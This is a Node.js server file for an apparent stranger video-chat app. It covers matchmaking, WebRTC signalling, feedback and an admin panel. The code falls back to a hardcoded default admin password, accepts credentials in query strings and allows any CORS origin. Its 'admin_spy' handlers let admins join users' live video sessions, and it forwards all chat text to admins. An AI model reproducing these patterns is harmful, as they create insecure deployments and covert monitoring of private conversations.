require('dotenv').config();
const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const mongoose = require('mongoose');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = new Server(server, { cors: { origin: '*', methods: ['GET','POST'] }, maxHttpBufferSize: 1e6 });
app.set('trust proxy', 1);
app.use(express.json({ limit: '80kb' }));
app.use(express.static(path.join(__dirname, '../public'), { maxAge: process.env.NODE_ENV === 'production' ? '1h' : 0, etag: true }));

const ADMIN_USERNAME = process.env.ADMIN_USERNAME || 'admin';
const ADMIN_PASSWORD = process.env.ADMIN_PASSWORD || 'Admin@1234';
const ADMIN_EMAIL = process.env.ADMIN_EMAIL || 'admin@example.com';
const MONGODB_URI = process.env.MONGODB_URI || '';
let dbConnected = false;

const SessionSchema = new mongoose.Schema({
  sessionId: { type:String, index:true },
  user1: { socketId:String, country:String, gender:String },
  user2: { socketId:String, country:String, gender:String },
  startedAt: { type: Date, default: Date.now }, endedAt: Date, duration: Number,
  flagged: { type:Boolean, default:false }, flagReason:String
});
const FeedbackSchema = new mongoose.Schema({
  name:String, email:String, message:String, path:String, userAgent:String,
  ip:String, createdAt: { type: Date, default: Date.now }
});
const Session = mongoose.models.Session || mongoose.model('Session', SessionSchema);
const Feedback = mongoose.models.Feedback || mongoose.model('Feedback', FeedbackSchema);
const feedbackMemory = [];

if (MONGODB_URI && !MONGODB_URI.includes('username:password')) {
  mongoose.connect(MONGODB_URI).then(()=>{ dbConnected=true; console.log('✅ MongoDB connected'); })
    .catch(err=>console.warn('⚠️ MongoDB not connected, feedback will use memory only:', err.message));
} else {
  console.warn('⚠️ MONGODB_URI missing. Feedback will not persist after restart.');
}

const waitingPool = new Map();
const activePairs = new Map();
const adminSockets = new Set();
const userMeta = new Map();

function cleanGender(v){ return ['male','female','couples','any'].includes(v) ? v : 'any'; }
function cleanCountry(v){ return typeof v === 'string' ? v.slice(0,3) : 'any'; }
function getStats(){ return { online:userMeta.size, waiting:waitingPool.size, active:activePairs.size/2, admins:adminSockets.size }; }
function broadcastStats(){ io.emit('stats', getStats()); }
function notifyAdmins(event, data){ for(const id of adminSockets){ const s=io.sockets.sockets.get(id); if(s) s.emit(event,data); } }
function wants(pref, actual){ return pref === 'any' || pref === actual; }
function findMatch(socket, myMeta, myFilters){
  for (const [id, w] of waitingPool) {
    if (id === socket.id) continue;
    const tm = w.meta || {}; const tf = w.filters || {};
    if (wants(myFilters.gender, tm.gender) && wants(myFilters.country, tm.country) && wants(tf.gender, myMeta.gender) && wants(tf.country, myMeta.country)) {
      return { matchId:id, matchSocket:w.socket, matchMeta:tm };
    }
  }
  return null;
}
async function createSession(a,b,ma,mb){
  const sessionId = uuidv4(); const startedAt = new Date();
  const sessionData = { sessionId, user1:{socketId:a.id,country:ma.country,gender:ma.gender}, user2:{socketId:b.id,country:mb.country,gender:mb.gender}, startedAt };
  activePairs.set(a.id,{ partner:b.id, sessionId, sessionData }); activePairs.set(b.id,{ partner:a.id, sessionId, sessionData });
  a.emit('matched',{ sessionId, partnerCountry:mb.country, partnerGender:mb.gender, role:'caller' });
  b.emit('matched',{ sessionId, partnerCountry:ma.country, partnerGender:ma.gender, role:'callee' });
  notifyAdmins('session_started',{ sessionId, user1:{id:a.id,...ma}, user2:{id:b.id,...mb}, startedAt });
  if(dbConnected){ try{ await Session.create(sessionData); }catch{} }
  broadcastStats();
}
async function endSession(socketId, reason='disconnect'){
  const pair=activePairs.get(socketId); if(!pair) return false;
  const { partner, sessionId, sessionData } = pair;
  activePairs.delete(socketId); activePairs.delete(partner);
  const partnerSocket=io.sockets.sockets.get(partner); if(partnerSocket) partnerSocket.emit('partner_disconnected',{reason});
  const duration=Math.max(0, Math.round((Date.now()-new Date(sessionData.startedAt).getTime())/1000));
  notifyAdmins('session_ended',{sessionId,duration,reason});
  if(dbConnected){ try{ await Session.updateOne({sessionId},{endedAt:new Date(),duration}); }catch{} }
  broadcastStats(); return true;
}
function adminOk(req){
  const u = req.headers['x-admin-user'] || req.query.username;
  const p = req.headers['x-admin-pass'] || req.query.password;
  return u === ADMIN_USERNAME && p === ADMIN_PASSWORD;
}

app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'../public/index.html')));
app.get('/admin-panel-x7k2', (req,res)=>res.sendFile(path.join(__dirname,'../admin/index.html')));
app.get('/api/stats', (req,res)=>res.json(getStats()));
app.get('/robots.txt',(req,res)=>{ const base=`${req.protocol}://${req.get('host')}`; res.type('text/plain').send(`User-agent: *\nAllow: /\nDisallow: /admin-panel-x7k2\nSitemap: ${base}/sitemap.xml\n`); });
app.get('/sitemap.xml',(req,res)=>{ const base=`${req.protocol}://${req.get('host')}`; res.type('application/xml').send(`<?xml version="1.0" encoding="UTF-8"?>\n<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"><url><loc>${base}/</loc><priority>1.0</priority><changefreq>daily</changefreq></url></urlset>`); });

app.post('/api/feedback', async (req,res)=>{
  const { name='', email='', message='', path:pagePath='' } = req.body || {};
  if(typeof message !== 'string' || message.trim().length < 3) return res.status(400).json({ok:false,error:'Please write the problem first.'});
  const doc = { name:String(name).slice(0,80), email:String(email).slice(0,120), message:String(message).trim().slice(0,1200), path:String(pagePath).slice(0,200), userAgent:String(req.get('user-agent')||'').slice(0,300), ip:String(req.ip||'').slice(0,80), createdAt:new Date() };
  let saved = { ...doc, _id: uuidv4() };
  if(dbConnected){ try{ saved = await Feedback.create(doc); }catch(e){ feedbackMemory.unshift(saved); } } else feedbackMemory.unshift(saved);
  feedbackMemory.splice(100);
  notifyAdmins('feedback_received', saved);
  res.json({ok:true, adminEmail:ADMIN_EMAIL});
});
app.get('/api/admin/feedback', async (req,res)=>{
  if(!adminOk(req)) return res.status(401).json({ok:false});
  let items = feedbackMemory;
  if(dbConnected){ try{ items = await Feedback.find({}).sort({createdAt:-1}).limit(200).lean(); }catch{} }
  res.json({ok:true, items});
});
app.delete('/api/admin/feedback/:id', async (req,res)=>{
  if(!adminOk(req)) return res.status(401).json({ok:false});
  const id = req.params.id;
  if(dbConnected){ try{ await Feedback.deleteOne({_id:id}); }catch{} }
  const idx = feedbackMemory.findIndex(x => String(x._id) === String(id)); if(idx>=0) feedbackMemory.splice(idx,1);
  notifyAdmins('feedback_deleted',{id}); res.json({ok:true});
});

io.on('connection', socket=>{
  socket.on('admin_auth', ({username,password})=>{
    if(username===ADMIN_USERNAME && password===ADMIN_PASSWORD){
      adminSockets.add(socket.id); socket.emit('admin_auth_success');
      const activeSessions=[]; const seen=new Set();
      for(const [sid,pair] of activePairs){ if(seen.has(pair.sessionId)) continue; seen.add(pair.sessionId); activeSessions.push({ sessionId:pair.sessionId, user1:{id:sid,...(userMeta.get(sid)||{})}, user2:{id:pair.partner,...(userMeta.get(pair.partner)||{})}, startedAt:pair.sessionData.startedAt }); }
      socket.emit('admin_state',{ stats:getStats(), activeSessions, waitingUsers:[...waitingPool.keys()].map(id=>({id,...waitingPool.get(id).meta,...waitingPool.get(id).filters})) });
    } else socket.emit('admin_auth_fail');
  });
  socket.on('admin_spy_request', ({sessionId})=>{ if(!adminSockets.has(socket.id)) return; for(const [sid,pair] of activePairs){ if(pair.sessionId===sessionId){ const u=io.sockets.sockets.get(sid); if(u) u.emit('admin_spy_join',{adminId:socket.id,sessionId}); } } });
  socket.on('admin_spy_offer', ({targetId,sdp,sessionId})=>{ const admin=io.sockets.sockets.get(targetId); if(admin && adminSockets.has(targetId)) admin.emit('admin_spy_offer',{fromId:socket.id,sdp,sessionId}); });
  socket.on('admin_spy_answer', ({adminId,sdp})=>{ const user=io.sockets.sockets.get(adminId); if(user) user.emit('admin_spy_answer',{fromId:socket.id,sdp}); });
  socket.on('admin_spy_ice', ({targetId,candidate})=>{ const target=io.sockets.sockets.get(targetId); if(target) target.emit('admin_spy_ice',{fromId:socket.id,candidate}); });
  socket.on('admin_spy_ice_answer', ({adminId,candidate})=>{ const user=io.sockets.sockets.get(adminId); if(user) user.emit('admin_spy_ice_answer',{fromId:socket.id,candidate}); });
  socket.on('admin_flag_session', async ({sessionId, reason})=>{ if(!adminSockets.has(socket.id)) return; if(dbConnected){try{await Session.updateOne({sessionId},{flagged:true,flagReason:reason});}catch{}} notifyAdmins('session_flagged',{sessionId,reason}); for(const [sid,pair] of activePairs){ if(pair.sessionId===sessionId){ const s=io.sockets.sockets.get(sid); if(s) s.emit('kicked',{reason:'Removed by moderator.'}); } } });

  socket.on('user_join', ({gender,country})=>{ userMeta.set(socket.id,{gender:cleanGender(gender),country:cleanCountry(country),joinedAt:new Date()}); broadcastStats(); });
  socket.on('find_match', async ({gender,country,filterGender,filterCountry})=>{
    await endSession(socket.id,'skipped'); waitingPool.delete(socket.id);
    const myMeta={gender:cleanGender(gender),country:cleanCountry(country)}; const myFilters={gender:cleanGender(filterGender),country:cleanCountry(filterCountry)};
    userMeta.set(socket.id,{...myMeta,joinedAt:new Date(),filters:myFilters});
    const match=findMatch(socket,myMeta,myFilters);
    if(match){ waitingPool.delete(match.matchId); await createSession(socket,match.matchSocket,myMeta,match.matchMeta); }
    else { waitingPool.set(socket.id,{socket,meta:myMeta,filters:myFilters,joinedAt:new Date()}); socket.emit('waiting'); notifyAdmins('user_waiting',{id:socket.id,...myMeta,filters:myFilters}); }
    broadcastStats();
  });
  socket.on('offer', ({sdp})=>{ const p=activePairs.get(socket.id); const s=p&&io.sockets.sockets.get(p.partner); if(s) s.emit('offer',{sdp}); });
  socket.on('answer', ({sdp})=>{ const p=activePairs.get(socket.id); const s=p&&io.sockets.sockets.get(p.partner); if(s) s.emit('answer',{sdp}); });
  socket.on('ice_candidate', ({candidate})=>{ const p=activePairs.get(socket.id); const s=p&&io.sockets.sockets.get(p.partner); if(s) s.emit('ice_candidate',{candidate}); });
  socket.on('chat_message', ({text})=>{ const p=activePairs.get(socket.id); if(!p || typeof text!=='string') return; const clean=text.trim().slice(0,500); if(!clean) return; const partner=io.sockets.sockets.get(p.partner); if(partner) partner.emit('chat_message',{text:clean,from:'stranger'}); notifyAdmins('chat_message',{sessionId:p.sessionId,from:socket.id,text:clean,at:new Date()}); });
  socket.on('skip', async ()=>{ waitingPool.delete(socket.id); await endSession(socket.id,'skipped'); broadcastStats(); });
  socket.on('disconnect', async ()=>{ adminSockets.delete(socket.id); waitingPool.delete(socket.id); await endSession(socket.id,'disconnect'); userMeta.delete(socket.id); notifyAdmins('user_left',{id:socket.id}); broadcastStats(); });
});

const PORT=process.env.PORT||3000;
server.listen(PORT,()=>{ console.log(`🚀 KineticCam running on http://localhost:${PORT}`); console.log(`🔒 Admin: http://localhost:${PORT}/admin-panel-x7k2`); });
